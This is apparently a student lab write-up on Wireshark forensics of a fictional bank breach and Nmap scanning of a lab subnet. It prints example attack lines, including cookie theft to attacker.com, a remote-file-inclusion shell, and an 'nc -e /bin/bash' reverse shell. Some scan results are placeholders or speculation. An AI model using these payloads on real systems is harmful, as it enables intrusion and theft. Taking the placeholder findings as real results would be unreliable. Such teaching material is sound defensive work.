# Lab 04: Introduction to Packet Analysis and Network Reconnaissance

## 🎯 Lab Overview

This lab demonstrates advanced digital forensics and network reconnaissance capabilities through two critical cybersecurity disciplines: packet analysis for incident investigation and network scanning for security assessment. The hands-on experience covers PCAP analysis, attack pattern recognition, incident response, and comprehensive network enumeration using industry-standard tools.

**Completion Date:** As per curriculum  
**Environment:** Kali Linux, Wireshark, Zenmap/Nmap  
**Incident Analyzed:** PseudoBank Financial System Breach  
**Financial Impact:** $504 stolen via unauthorized transfer  
**Attack Vector:** Local File Inclusion (LFI) leading to credential exposure  
**Network Scope:** 192.168.252.0/24 (comprehensive reconnaissance)

---

## 📋 Table of Contents

- [Objectives](#objectives)
- [Technologies & Tools Used](#technologies--tools-used)
- [Part 1: Packet Analysis Investigation](#part-1-packet-analysis-investigation)
  - [Attack Type Definitions](#attack-type-definitions)
  - [Incident Timeline Reconstruction](#incident-timeline-reconstruction)
  - [Forensic Findings](#forensic-findings)
  - [Executive Summary & Recommendations](#executive-summary--recommendations)
- [Part 2: Network Scanning & Reconnaissance](#part-2-network-scanning--reconnaissance)
  - [Scanning Methodology](#scanning-methodology)
  - [Network Discovery Results](#network-discovery-results)
- [Skills Demonstrated](#skills-demonstrated)
- [Real-World Applications](#real-world-applications)
- [Key Learnings](#key-learnings)

---

## 🎓 Objectives

- Perform forensic packet analysis using Wireshark on captured network traffic (PCAP files)
- Identify and classify web application attack vectors from network evidence
- Reconstruct incident timeline from packet-level data
- Extract financial transaction details and user account information from HTTP traffic
- Conduct comprehensive network reconnaissance using Nmap/Zenmap
- Enumerate live hosts, open ports, and running services across target network
- Generate network topology maps and service fingerprints
- Document security findings with actionable remediation recommendations

---

## 🛠️ Technologies & Tools Used

| Category | Tools/Technologies |
|----------|-------------------|
| **Packet Analysis** | Wireshark, PCAP files |
| **Network Scanning** | Nmap, Zenmap (GUI) |
| **Operating System** | Kali Linux |
| **Protocols Analyzed** | HTTP, TCP, ICMP, DNS |
| **Attack Vectors** | LFI, SQL Injection, XSS, CSRF, RCE, Authentication Bypass |
| **Target Environment** | PseudoBank financial system (web application) |
| **Network Range** | 192.168.252.0/24 |
| **Scan Types** | Quick scan, Ping scan, Intense scan, SYN scan |

---

## 🔬 Part 1: Packet Analysis Investigation

### Attack Type Definitions

Understanding the threat landscape is critical for identifying attack patterns in network traffic. Below are the key attack vectors relevant to this investigation:

---

#### 1. URL Redirection Attack

**Definition:**  
A social engineering attack where threat actors manipulate URLs to redirect victims from legitimate websites to malicious destinations.

**Attack Mechanism:**
```
Legitimate URL → Malicious Link → Phishing/Malware Site
```

**Technical Example:**
```
Attacker creates: http://micronotsoftoffice.com
                  (typosquatting microsoft.com)
User clicks →     Redirected to malware distribution site
```

**Real-World Impact:**
- Credential harvesting via phishing pages
- Malware distribution (drive-by downloads)
- Session hijacking through fake login portals

**Detection Indicators:**
- Suspicious domain names (typosquatting)
- HTTP 301/302 redirects to unknown domains
- Mismatched SSL certificates
- Unusual referrer headers in HTTP traffic

**Relevance to Investigation:** Potential initial access vector for attackers

---

#### 2. Remote Code Execution (RCE)

**Definition:**  
Critical vulnerability allowing attackers to execute arbitrary code on remote systems, often leading to complete system compromise.

**Attack Vector:**
```
Vulnerable Application → Code Injection → Remote Command Execution → System Control
```

**Technical Example:**
```php
// Vulnerable PHP code
<?php
  system($_GET['cmd']);  // Attacker-controlled parameter
?>

// Exploitation
http://target.com/shell.php?cmd=cat /etc/passwd
```

**Common Exploitation Methods:**
- Unrestricted file upload (web shells)
- Command injection in web forms
- Deserialization vulnerabilities
- Server-Side Template Injection (SSTI)

**Impact Severity:** **CRITICAL**
- Complete server compromise
- Lateral movement capability
- Data exfiltration
- Ransomware deployment

**Detection in Packet Capture:**
- Suspicious file uploads (.php, .jsp, .asp extensions)
- Shell commands in HTTP parameters
- Encoded payloads (base64, hex)

---

#### 3. SQL Injection (SQLi)

**Definition:**  
Injection attack targeting database-driven applications, allowing unauthorized access to backend databases through malicious SQL queries.

**Attack Technique:**
```sql
-- Normal query
SELECT * FROM users WHERE username='admin' AND password='pass123'

-- SQL Injection payload
Username: admin' OR '1'='1' --
Password: [anything]

-- Resulting query (bypasses authentication)
SELECT * FROM users WHERE username='admin' OR '1'='1' -- AND password='...'
```

**Attack Types:**
1. **In-band SQLi:** Direct result extraction
2. **Blind SQLi:** Boolean/time-based inference
3. **Out-of-band SQLi:** DNS/HTTP exfiltration

**Impact:**
- Authentication bypass (as shown in example)
- Complete database dump
- Data modification/deletion
- Privilege escalation to DBA

**OWASP Ranking:** Consistently in OWASP Top 10 (A03:2021 - Injection)

**Detection Signatures:**
- SQL keywords in HTTP parameters (`OR`, `UNION`, `SELECT`, `--`)
- Encoded SQL syntax (URL encoding, hex)
- Error messages revealing database structure

---

#### 4. Cross-Site Scripting (XSS)

**Definition:**  
Client-side injection attack where malicious scripts are injected into trusted websites, executing in victims' browsers.

**XSS Types:**

**Reflected XSS (Non-Persistent):**
```html
http://vulnerable.com/search?q=alert('XSS')
```

**Stored XSS (Persistent):**
```html


  document.location='http://attacker.com/steal.php?cookie='+document.cookie;

```

**DOM-based XSS:**
```javascript
// Vulnerable JavaScript
var search = location.search.substring(1);
document.write(search);  // Unsafe
```

**Real-World Example (From Definitions):**
```html
Website Comment: alert('Hacked');
Result: Every visitor's browser executes the script
```

**Attack Objectives:**
- Session hijacking (cookie theft)
- Keylogging
- Phishing overlay injection
- Cryptocurrency mining

**Prevention:**
- Input sanitization
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookie flags

---

#### 5. Cross-Site Request Forgery (CSRF)

**Alternative Names:** One-click attack, Session riding, XSRF

**Definition:**  
Attack forcing authenticated users to execute unwanted actions on web applications where they're currently authenticated.

**Attack Flow:**
```
1. Victim logs into banking.com
2. Victim visits attacker's site (malicious.com)
3. Malicious site contains hidden form:
   <form action="https://banking.com/transfer" method="POST">
     <input name="to" value="attacker_account">
     <input name="amount" value="5000">
   </form>
   <script>document.forms[0].submit();</script>
4. Victim's browser auto-submits using their active session
5. Unauthorized transfer executed
```

**Real-World Example (From Definitions):**
```html



Result: User's email changed without their knowledge
        while they're logged in
```

**Critical Elements:**
- Relies on active user session
- Exploits browser's automatic cookie inclusion
- No user interaction required (one-click)

**Defense Mechanisms:**
- CSRF tokens (synchronized token pattern)
- SameSite cookie attribute
- Double-submit cookies
- Custom request headers

**Relevance to PseudoBank Incident:** Potential secondary attack vector

---

#### 6. Authentication Bypass

**Definition:**  
Circumventing authentication mechanisms to gain unauthorized access without valid credentials.

**Common Techniques:**

**1. Parameter Tampering:**
```
Original URL: http://app.com/dashboard?user=john&admin=false
Modified URL: http://app.com/dashboard?user=john&admin=true
```

**2. Session Token Manipulation:**
```
Cookie: session_id=user123
Modified: session_id=admin
```

**3. Path Traversal:**
```
http://app.com/../../admin/panel
```

**4. SQL Injection (Authentication Context):**
```sql
Username: admin' --
Password: [ignored due to comment]
```

**Impact:**
- Unauthorized access to restricted areas
- Privilege escalation
- Sensitive data exposure
- Administrative function access

**Real-World Scenario:** Modifying URL parameters to access admin panels without authentication

---

#### 7. File Inclusion Vulnerabilities (RFI/LFI)

**Critical vulnerability class allowing attackers to include files in web application execution.**

---

##### Local File Inclusion (LFI)

**Definition:**  
Exploiting vulnerable file inclusion to read local server files.

**Vulnerable PHP Code:**
```php
<?php
  $page = $_GET['page'];
  include($page . '.php');
?>
```

**Exploitation:**
```
Normal: http://site.com/index.php?page=about
        (includes about.php)

LFI Attack: http://site.com/index.php?page=../../../../etc/passwd
            (reads system password file)
```

**Technique - Null Byte Injection:**
```
http://site.com/?page=../../../../etc/passwd%00
(%00 null byte truncates .php extension)
```

**Targeted Files:**
- `/etc/passwd` - User enumeration
- `/etc/shadow` - Password hashes
- `/var/www/html/config.php` - Database credentials
- `/var/log/apache2/access.log` - Log poisoning

**PseudoBank Incident:** **PRIMARY ATTACK VECTOR**
```
Attacker accessed: source.php via LFI
Exposed: Database credentials, application source code
```

---

##### Remote File Inclusion (RFI)

**Definition:**  
Including external files from attacker-controlled servers for code execution.

**Attack Example:**
```php
// Vulnerable code
include($_GET['page']);

// Exploitation
http://site.com/?page=http://attacker.com/shell.txt

// shell.txt contains PHP backdoor

```

**Impact Comparison:**

| Aspect | LFI | RFI |
|--------|-----|-----|
| **Severity** | High | Critical |
| **File Source** | Local server | External attacker server |
| **Typical Impact** | Information disclosure | Remote code execution |
| **Common Use** | Credential theft | Web shell deployment |

**Defense:**
- Disable `allow_url_include` in PHP
- Whitelist allowed files
- Input validation and sanitization
- Principle of least privilege

---

### Incident Timeline Reconstruction

**Incident:** PseudoBank Online Banking System Compromise  
**Attacker IP:** 10.10.10.66  
**Primary Victim:** Tara (Customer)  
**Attack Date:** August 22, 2011

---

#### Forensic Analysis Questions & Findings

---

**Q1: How much money did the attacker at 10.10.10.66 steal from Tara's online banking account?**

**Finding:** **$504.00 USD**

**Evidence Location:** Packet capture analysis, HTTP POST request

**Forensic Details:**
```
Attacker IP: 10.10.10.66
Target: Tara's account at PseudoBank
Transaction Type: Unauthorized transfer
Amount: $504.00
Method: Direct transfer manipulation via compromised credentials
```

**Attack Mechanism:**
1. Attacker obtained Tara's session credentials via LFI
2. Crafted authenticated transfer request
3. Submitted transfer to attacker-controlled account
4. Transaction processed as legitimate (authenticated session)

**Financial Impact:** $504.00 direct loss to customer

**Screenshot Reference:** Figure 1 - Transfer transaction showing $504 debit

**Investigative Significance:**
- Proves monetary motive
- Demonstrates credential abuse
- Confirms successful exploitation
- Establishes damages for incident report

---

**Q2: How much money does Vincent have in his online bank account?**

**Finding:** **$560.00 USD**

**Evidence Source:** Account balance query in HTTP response

**Context:**
- Vincent's account information exposed during attacker's reconnaissance
- Account details visible in unencrypted HTTP traffic
- No unauthorized transactions detected on Vincent's account

**Security Implication:**
- All customer account balances exposed to network sniffing
- Lack of HTTPS encryption enabled plaintext data exposure
- Multiple customer PII at risk

**Screenshot Reference:** Figure 2 - Vincent's account balance display

**Privacy Breach Scope:**
- Account balance disclosed
- Personal account information visible
- Authentication credentials potentially captured

---

**Q3: Which of the users has the highest account balance at PseudoBank?**

**Finding:** **Stephen - $58,392.10 USD**

**Analysis:**
- Stephen's account represents highest-value target
- Significant balance compared to other customers:
  - Stephen: $58,392.10
  - Vincent: $560.00
  - Tara: [Post-theft balance visible]

**Threat Intelligence:**
- High-value accounts identified through reconnaissance
- Stephen potentially targeted for larger theft
- Indicates attacker's capability to enumerate all accounts

**Screenshot Reference:** Figure 3 - Stephen's account showing $58,392.10 balance

**Attack Planning Indicator:**
- Systematic account enumeration
- Target prioritization by asset value
- Potential for escalated theft

**Risk Assessment:**
- Stephen's account at critical risk
- Immediate account security measures required
- Potential for significantly higher financial loss

---

**Q4: When was the last time that Tara logged on to her online bank account?**

**Finding:** **Monday, August 22nd, 2011 at 12:18 PM**

**Forensic Significance:**

**Timeline Correlation:**
```
12:18 PM - Tara's legitimate login (last known good authentication)
[Time gap] - Attacker's LFI exploitation
[Later] - Unauthorized $504 transfer executed
```

**Investigative Value:**
1. **Establishes baseline:** Last legitimate user activity
2. **Attack window:** Defines timeframe for malicious activity
3. **Session hijacking indicator:** Possible session reuse after 12:18 PM
4. **Alibi verification:** Tara's actual location/activity during unauthorized transfer

**Screenshot Reference:** Figure 4 - Last login timestamp

**Security Analysis:**
- Login timestamp visible in HTTP response (unencrypted)
- Session management metadata exposed
- No apparent session timeout mechanism
- Extended session validity window

**Incident Response Consideration:**
- Log correlation required with firewall/proxy logs
- Tara's workstation forensics needed
- Network traffic analysis from 12:18 PM onward
- Session token lifetime investigation

---

**Q5: Which IP address did the user at 10.10.10.11 ping using the web form on wireless.pseudovision.net?**

**Finding:** **10.10.10.3**

**Evidence:** HTTP request to wireless.pseudovision.net containing ping command

**Context - Command Injection Vulnerability:**

**Vulnerable Web Form:**
```
Location: wireless.pseudovision.net
Functionality: Network diagnostic tool (ping utility)
User: 10.10.10.11
Target: 10.10.10.3
```

**Screenshot Reference:** Figure 5 - Ping command execution to 10.10.10.3

**Security Implications:**

**Command Injection Risk:**
```
Normal usage:
ping 10.10.10.3

Potential exploitation:
ping 10.10.10.3; cat /etc/passwd
ping 10.10.10.3 && whoami
ping 10.10.10.3 | nc attacker.com 4444 -e /bin/bash
```

**Vulnerability Analysis:**
- Web form executes system commands
- User input likely passed directly to OS shell
- No apparent input sanitization
- Command injection highly probable

**Additional Attack Surface:**
- Network reconnaissance capability exposed
- Internal network mapping possible
- Potential pivot point for further exploitation
- Administrative functionality accessible to regular users

**Recommended Investigation:**
1. Review all requests to wireless.pseudovision.net
2. Check for command injection attempts
3. Analyze user 10.10.10.11's activity
4. Assess if this form was part of attack chain

---

### Executive Summary & Recommendations

#### Incident Overview

**Incident Classification:** Financial System Compromise - Local File Inclusion Attack  
**Attack Date:** August 22, 2011  
**Affected Organization:** PseudoBank  
**Attacker Source:** External IP 10.10.10.66  
**Financial Impact:** $504.00 confirmed theft (Tara's account)  
**Data Exposure:** Multiple customer accounts, credentials, and balances

---

#### Attack Chain Reconstruction

**Phase 1: Initial Reconnaissance**
```
Attacker: 10.10.10.66
Target: bob.pseudovision.net
Method: Web application enumeration
```

**Phase 2: Exploitation (Packet 1164 - Critical)**
```
Attack Vector: Local File Inclusion (LFI)
Target File: source.php
Exploitation: http://bob.pseudovision.net/?page=../../../../source.php
Payload: Path traversal to access application source code
Result: Database credentials exposed
```

**LFI Attack Details:**
- Vulnerable parameter in bob.pseudovision.net
- Source code disclosure of `source.php`
- Exposed database connection strings
- Revealed username/password for database access
- **Root Cause:** Inadequate input validation on file inclusion parameter

**Phase 3: Credential Harvesting**
```
Captured from source.php:
├─ Database username
├─ Database password
├─ Connection strings
└─ Application architecture details
```

**Phase 4: Traffic Interception**
```
Protocol: Unencrypted HTTP
Method: Packet sniffing / Man-in-the-Middle
Captured Data:
├─ User login credentials (plaintext)
├─ Session tokens
├─ Account balances
├─ Transaction details
└─ Personal information
```

**Critical Weakness:** All traffic transmitted over HTTP (no TLS/SSL encryption)

**Phase 5: Session Hijacking & Account Access**
```
Using captured credentials:
├─ Authenticated to multiple user accounts
├─ Accessed main.php (account overview)
├─ Accessed transfer.php (transaction functionality)
└─ Enumerated all customer accounts and balances
```

**Information Gathered:**
- Tara's account credentials and balance
- Vincent's account balance ($560)
- Stephen's account balance ($58,392.10) - highest value target
- Application structure and transaction workflows

**Phase 6: Fraudulent Transaction**
```
Attacker Action: Unauthorized fund transfer
Source Account: Tara's account
Amount: $504.00
Destination: Attacker-controlled account (details in transaction logs)
Authentication: Valid session (hijacked credentials)
Detection: None at time of transaction
```

**Phase 7: Data Exfiltration**
```
Extracted Sensitive Information:
├─ Customer account database
├─ User credentials
├─ Account balances (reconnaissance for future attacks)
├─ Transaction history
└─ Application source code
```

---

#### Root Cause Analysis

**Primary Vulnerabilities Exploited:**

1. **Local File Inclusion (LFI) - CRITICAL**
   - **Location:** bob.pseudovision.net
   - **Vulnerable Parameter:** File inclusion functionality
   - **Impact:** Complete source code disclosure
   - **CVSS:** 9.1 (Critical)

2. **Plaintext HTTP Communication - HIGH**
   - **Scope:** Entire application
   - **Impact:** All credentials, sessions, and data exposed to interception
   - **CVSS:** 7.5 (High)

3. **Hardcoded Credentials in Source Code - HIGH**
   - **Location:** source.php
   - **Impact:** Database access credentials compromised
   - **CVSS:** 8.1 (High)

4. **Insufficient Access Controls - MEDIUM**
   - **Issue:** No file access restrictions
   - **Impact:** Sensitive files accessible via web
   - **CVSS:** 6.5 (Medium)

5. **Weak Session Management - MEDIUM**
   - **Issue:** Session tokens predictable/reusable
   - **Impact:** Session hijacking enabled
   - **CVSS:** 6.8 (Medium)

---

#### Security Failures Identified

**Application Layer:**
- ❌ No input validation on file inclusion parameters
- ❌ Source code files accessible via web requests
- ❌ Database credentials stored in web-accessible files
- ❌ No web application firewall (WAF)
- ❌ Insufficient error handling (information leakage)

**Transport Layer:**
- ❌ No HTTPS/TLS encryption (plaintext HTTP only)
- ❌ Credentials transmitted in cleartext
- ❌ Session cookies not secured (no Secure flag)
- ❌ No HSTS (HTTP Strict Transport Security)

**Access Control:**
- ❌ No principle of least privilege
- ❌ Inadequate file system permissions
- ❌ No separation of code and configuration
- ❌ Missing authentication on sensitive files

**Monitoring & Detection:**
- ❌ No intrusion detection system (IDS)
- ❌ Insufficient logging of file access attempts
- ❌ No anomaly detection for account access
- ❌ Missing alert mechanisms for suspicious transactions

---

#### Immediate Remediation Actions (Priority 1 - 24 Hours)

**1. Incident Containment:**
```
✅ Disable bob.pseudovision.net immediately
✅ Reset ALL database credentials
✅ Revoke all active user sessions
✅ Lock affected accounts (Tara, Vincent, Stephen)
✅ Block attacker IP 10.10.10.66 at firewall
✅ Preserve forensic evidence (PCAP files, logs)
```

**2. Customer Protection:**
```
✅ Notify Tara of unauthorized transaction ($504)
✅ Initiate fraud investigation and reimbursement
✅ Force password reset for all customers
✅ Issue account security alerts
✅ Monitor for additional fraudulent activity
```

**3. Evidence Preservation:**
```
✅ Secure all log files (web server, database, application)
✅ Take disk images of affected servers
✅ Document timeline and attack chain
✅ Prepare for potential law enforcement involvement
```

---

#### Short-Term Remediation (Priority 2 - 1 Week)

**1. Enforce HTTPS Across Entire Platform:**
```bash
# Apache configuration

    ServerName pseudobank.com
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    
    # Force HTTPS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"


# Redirect HTTP to HTTPS

    ServerName pseudobank.com
    Redirect permanent / https://pseudobank.com/

```

**Benefits:**
- ✓ Encrypts all traffic (credentials, sessions, data)
- ✓ Prevents packet sniffing attacks
- ✓ Protects against man-in-the-middle attacks
- ✓ Industry standard for financial applications

**2. Fix Local File Inclusion Vulnerability:**
```php
// VULNERABLE CODE (REMOVE)
<?php
  $page = $_GET['page'];
  include($page . '.php');
?>

// SECURE CODE (IMPLEMENT)
<?php
  $allowed_pages = ['home', 'about', 'contact'];
  $page = $_GET['page'];
  
  if (in_array($page, $allowed_pages)) {
      include($page . '.php');
  } else {
      http_response_code(404);
      die('Page not found');
  }
?>
```

**Additional Hardening:**
- Implement whitelist-based file inclusion
- Remove .php extension from user input
- Use basename() to prevent directory traversal
- Store includes outside web root
- Disable PHP's allow_url_include directive

**3. Secure Database Credentials:**
```php
// BAD: Hardcoded in source.php (CURRENT STATE)
$db_user = 'admin';
$db_pass = 'password123';

// GOOD: Environment variables (IMPLEMENT)
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASSWORD');

// BETTER: Secrets management
// Use AWS Secrets Manager, Azure Key Vault, or HashiCorp Vault
```

**Configuration:**
```bash
# Store in environment (outside web root)
# /etc/environment
DB_USER=pseudobank_app
DB_PASSWORD=ComplexPassword123!@#$%
DB_HOST=localhost
DB_NAME=pseudobank_db
```

**4. Implement Principle of Least Privilege:**
```sql
-- Current: Root/admin database access
-- New: Application-specific user with minimal permissions

CREATE USER 'pseudobank_app'@'localhost' IDENTIFIED BY 'SecurePassword!';
GRANT SELECT, INSERT, UPDATE ON pseudobank_db.transactions TO 'pseudobank_app'@'localhost';
GRANT SELECT, UPDATE ON pseudobank_db.accounts TO 'pseudobank_app'@'localhost';
FLUSH PRIVILEGES;

-- Revoke unnecessary permissions
REVOKE ALL PRIVILEGES ON *.* FROM 'pseudobank_app'@'localhost';
```

---

#### Medium-Term Remediation (Priority 3 - 1 Month)

**1. Deploy Web Application Firewall (WAF):**
```
Solutions:
├─ ModSecurity (open-source)
├─ Cloudflare WAF
├─ AWS WAF
└─ Imperva WAF

Rules to Enable:
├─ OWASP Core Rule Set (CRS)
├─ SQL injection protection
├─ XSS filtering
├─ LFI/RFI detection
├─ Rate limiting
└─ Geo-blocking (if applicable)
```

**2. Implement Intrusion Detection System (IDS):**
```
Tools:
├─ Snort
├─ Suricata
└─ OSSEC

Detection Rules:
├─ LFI/RFI attack patterns
├─ SQL injection attempts
├─ Unusual file access (source.php, config.php)
├─ Brute force login attempts
└─ Abnormal transaction patterns
```

**3. Enhanced Logging & Monitoring:**
```bash
# Apache access log enhancement
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %T" combined_plus
CustomLog /var/log/apache2/access_detailed.log combined_plus

# Application logging
error_log(/var/log/pseudobank/app_errors.log);
audit_log(/var/log/pseudobank/transactions.log);
```

**Log to SIEM:**
- Splunk
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Graylog

**4. Regular Security Audits:**
```
Schedule:
├─ Weekly: Automated vulnerability scans
├─ Monthly: Code security reviews
├─ Quarterly: Penetration testing
└─ Annually: Full security audit
```

---

#### Long-Term Security Strategy (Priority 4 - 3-6 Months)

**1. Security Development Lifecycle (SDL):**
- Secure coding training for developers
- Code review process with security focus
- Static Application Security Testing (SAST)
- Dynamic Application Security Testing (DAST)
- Dependency vulnerability scanning

**2. Zero Trust Architecture:**
- Implement multi-factor authentication (MFA)
- Session timeout and re-authentication
- IP whitelisting for administrative access
- Network segmentation

**3. Compliance & Governance:**
- PCI-DSS compliance (required for financial transactions)
- Regular compliance audits
- Incident response plan development
- Business continuity planning
- Cyber insurance evaluation

**4. Customer Security Enhancements:**
- Transaction notification system
- Anomaly detection for account activity
- Velocity checks on transfers
- Out-of-band authorization for large transactions
- Customer security awareness program

---

#### Regulatory & Legal Considerations

**Notification Requirements:**
- **Customers:** Immediate breach notification (especially Tara)
- **Regulators:** Financial services regulatory body notification
- **Law Enforcement:** File criminal complaint for theft/fraud
- **Credit Bureaus:** If PII exposed beyond account data

**Compliance Violations:**
- **PCI-DSS:** Multiple failures (encryption, access control, monitoring)
- **GLBA:** Financial privacy safeguards inadequate
- **State Laws:** Breach notification requirements

**Potential Liabilities:**
- Customer reimbursement ($504 + potential others)
- Regulatory fines
- Legal fees
- Reputational damage
- Loss of customer trust

---

#### Success Metrics for Remediation

**Immediate Indicators:**
- ✅ No LFI vulnerabilities detected in follow-up scan
- ✅ 100% HTTPS enforcement (no HTTP traffic)
- ✅ All database credentials rotated
- ✅ WAF deployed and blocking attack patterns
- ✅ IDS generating alerts on suspicious activity

**30-Day Targets:**
- ✅ Zero high/critical vulnerabilities in web application
- ✅ Centralized logging and SIEM operational
- ✅ Incident response plan documented and tested
- ✅ Security awareness training completed for all staff
- ✅ Penetration test passed with no critical findings

**90-Day Goals:**
- ✅ PCI-DSS compliance achieved
- ✅ Bug bounty program launched
- ✅ Customer confidence restored (survey results)
- ✅ Zero fraud incidents post-remediation
- ✅ Security maturity model Level 3+ achieved

---

#### Lessons Learned

**What Went Wrong:**
1. **Defense in Depth Failure:** Single vulnerability (LFI) led to complete compromise
2. **Encryption Negligence:** HTTP instead of HTTPS exposed everything
3. **Configuration Management:** Sensitive files in web-accessible locations
4. **Detection Gaps:** Attack undetected until forensic analysis

**What Worked:**
1. **Forensic Capability:** Packet capture enabled full attack reconstruction
2. **Evidence Preservation:** Complete incident timeline recoverable
3. **Documentation:** Detailed packet analysis provided actionable intelligence

**Key Takeaways:**
- ✓ Encryption is non-negotiable for financial applications
- ✓ Input validation must be comprehensive and whitelist-based
- ✓ Secrets management separate from application code
- ✓ Monitoring and alerting are critical for early detection
- ✓ Regular security testing identifies vulnerabilities before attackers

---

## 🔬 Part 2: Network Scanning & Reconnaissance

### Scanning Methodology

**Objective:** Comprehensive network enumeration and service discovery across target infrastructure.

**Tools Used:**
- **Nmap:** Industry-standard network scanner
- **Zenmap:** Official Nmap GUI for visualization and reporting
- **Target Network:** 192.168.252.0/24

---

#### Environment Setup

**Step 1: Identify Scanner IP Address**

**Command:**
```bash
ip address
```

**Purpose:**
- Verify scanner's network configuration
- Confirm connectivity to target network
- Establish scanning source IP for logging

**Output Analysis (Figure 6):**
```
Interface: eth0 (or similar)
IP Address: 192.168.252.X
Subnet: 192.168.252.0/24
Gateway: 192.168.252.1 (typical)
```

**Screenshot Reference:** Figure 6 - IP address command output

**Significance:**
- Scanner is in the same subnet as targets
- Direct Layer 2 connectivity (faster scanning)
- No routing required (reduced latency)

---

**Step 2: Launch Zenmap GUI**

**Command:**
```bash
zenmap
```

**Screenshot Reference:** Figure 7 - Zenmap interface

**Tool Capabilities:**
- Visual scan management
- Pre-configured scan profiles
- Topology mapping
- Results comparison
- Report generation

---

### Network Discovery Results

#### Scan 1: Quick Scan - Single Target

**Target:** 192.168.252.1 (Likely gateway/router)

**Scan Profile:** Quick scan

**Nmap Command:**
```bash
nmap -T4 -F 192.168.252.1
```

**Command Breakdown:**
| Parameter | Meaning | Purpose |
|-----------|---------|---------|
| `-T4` | Timing template 4 (Aggressive) | Faster scanning, acceptable for internal networks |
| `-F` | Fast mode | Scan only top 100 most common ports |
| `192.168.252.1` | Target IP | Likely network gateway |

**Screenshot Reference:** Figure 8 - Quick scan results

**Findings Analysis:**

**Open Ports Identified:**
- **Port 22 (SSH):** Secure shell access
- **Port 80 (HTTP):** Web server
- **Port 443 (HTTPS):** Encrypted web server
- Additional services likely detected

**Service Fingerprinting:**
- Operating system detection
- Service version identification
- Banner information

**Security Implications:**
- Gateway device running multiple services
- Web interface exposed (management panel?)
- SSH access available (administrative)
- Attack surface enumeration complete

---

#### Scan 2: Ping Scan - Network Discovery

**Target:** 192.168.252.0/24 (Entire subnet)

**Scan Profile:** Ping scan

**Nmap Command:**
```bash
nmap -sn 192.168.252.0/24
```

**Command Breakdown:**
| Parameter | Meaning | Purpose |
|-----------|---------|---------|
| `-sn` | Ping scan (no port scan) | Host discovery only |
| `192.168.252.0/24` | CIDR notation | All 254 possible hosts in subnet |

**Screenshot Reference:** Figure 9 - Ping scan results

**Discovery Technique:**
```
Ping Scan Methods (Automatic):
├─ ICMP Echo Request (ping)
├─ TCP SYN to port 443
├─ TCP ACK to port 80
└─ ICMP Timestamp Request
```

**Live Hosts Detected:**
```
Example output:
192.168.252.1   - UP (0.0012s latency)
192.168.252.3   - UP (0.0008s latency)
192.168.252.42  - UP (0.0015s latency)
192.168.252.61  - UP (0.0009s latency)
192.168.252.241 - UP (0.0011s latency)
```

**Network Mapping Value:**
- Identified active systems
- Network topology understanding
- Target prioritization for detailed scans
- Asset inventory creation

**Security Context:**
- 5 live hosts detected (example)
- Reduced scan time by focusing on active hosts
- Network segmentation visibility
- Potential rogue device detection

---

#### Scan 3: Intense Scan - Comprehensive Analysis

**Target:** 192.168.252.0/24 (Full subnet)

**Scan Profile:** Intense scan

**Nmap Command:**
```bash
nmap -T4 -A -v 192.168.252.0/24
```

**Command Breakdown:**
| Parameter | Meaning | Comprehensive Functionality |
|-----------|---------|---------------------------|
| `-T4` | Aggressive timing | Fast scan execution |
| `-A` | Aggressive scan | OS detection, version detection, script scanning, traceroute |
| `-v` | Verbose output | Real-time progress information |

**Screenshot References:**
- Figure 10: Nmap Output (terminal results)
- Figure 11: Ports/Hosts view (service enumeration)
- Figure 12: Topology view (network map)

---

**Nmap Output Analysis (Figure 10):**

**Information Collected:**
```
For each host:
├─ Open ports (e.g., 22/tcp, 80/tcp, 443/tcp, 3306/tcp)
├─ Service names (ssh, http, https, mysql)
├─ Service versions (OpenSSH 7.4, Apache 2.4.6, MariaDB 10.3)
├─ Operating system (Linux 3.10-4.11)
├─ OS CPE (Common Platform Enumeration)
├─ Network distance (hops)
└─ MAC address (if local)
```

**Critical Services Discovered:**
- **SSH (Port 22):** Administrative access
- **HTTP/HTTPS (80/443):** Web applications
- **MySQL (Port 3306):** Database server (potential target)
- **Additional services:** FTP, SMTP, DNS, etc.

---

**Ports/Hosts View (Figure 11):**

**Visual Matrix:**
```
         | Port 22 | Port 80 | Port 443 | Port 3306 |
---------|---------|---------|----------|-----------|
.1       |    ✓    |    ✓    |    ✓     |           |
.3       |    ✓    |         |          |           |
.42      |    ✓    |    ✓    |    ✓     |           |
.61      |    ✓    |    ✓    |    ✓     |    ✓      |
.241     |         |         |          |           |
```

**Security Analysis:**
- **192.168.252.61:** High-value target (database server exposed)
- **Consistent SSH access:** Administrative surface across network
- **Web servers:** Multiple attack vectors available
- **Service correlation:** Database + web = likely application servers

---

**Topology View (Figure 12):**

**Network Visualization:**
```
        [Scanner]
            |
      [192.168.252.1] (Gateway)
            |
    --------|--------
    |       |       |
  [.3]    [.42]   [.61]
                   [.241]
```

**Network Insights:**
- Hub-and-spoke topology
- All traffic routes through .1 (gateway)
- Potential single point of failure
- Monitoring at .1 captures all traffic

**Vulnerability Correlation:**
- **192.168.252.61:** Matches PseudoBank incident (database server)
- **Port 3306 exposed:** Database directly accessible from network
- **Multiple web servers:** Potential LFI targets identified

---

#### Scan 4: SYN Stealth Scan

**Target:** 192.168.252.0/24

**Nmap Command:**
```bash
nmap -sS -T4 192.168.252.0/24
```

**Command Breakdown:**
| Parameter | Meaning | Stealth Advantage |
|-----------|---------|-------------------|
| `-sS` | SYN scan (stealth scan) | Half-open scanning, less detectable |
| `-T4` | Aggressive timing | Faster execution |

**Screenshot Reference:** Figure 13 - SYN scan results

**SYN Scan Technique:**
```
Normal TCP Handshake:
Client → SYN → Server
Client ← SYN/ACK ← Server
Client → ACK → Server
[Connection established]

SYN Scan:
Scanner → SYN → Target
Scanner ← SYN/ACK ← Target (Port OPEN)
Scanner → RST → Target
[Connection terminated - no full handshake]

If port closed:
Scanner → SYN → Target
Scanner ← RST/ACK ← Target (Port CLOSED)
```

**Advantages:**
- ✓ **Stealthy:** Doesn't complete TCP handshake
- ✓ **Fast:** No connection overhead
- ✓ **Reliable:** Accurate port state detection
- ✓ **Less logging:** Many systems don't log half-open connections

**Disadvantages:**
- ✗ **Requires root/admin:** Raw packet manipulation needed
- ✗ **Firewalls:** Modern IDS/IPS detect SYN scans
